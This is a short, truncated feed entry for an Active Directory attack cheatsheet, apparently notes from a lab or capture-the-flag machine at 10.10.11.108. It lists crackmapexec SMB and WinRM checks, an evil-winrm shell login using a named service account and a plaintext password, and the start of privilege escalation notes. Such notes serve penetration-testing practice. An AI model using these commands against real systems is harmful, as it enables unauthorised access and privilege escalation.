entry.title: AD-Cheatsheet
entry.summary: Recon Scan crackmapexec Check smb share crackmapexec smb 10.10.11.108 --shares crackmapexec smb 10.10.11.108 --shares -u svc-printer -p '1edFg43012!!' Check winrm crackmapexec winrm 10.10.11.108 -u svc-printer -p '1edFg43012!!' Exploit WinRM evil-winrm -i 10.10.11.108 -u svc-printer -p '1edFg43012!!' Privilege Escalation See priv whoami /priv Group priv Server Op...
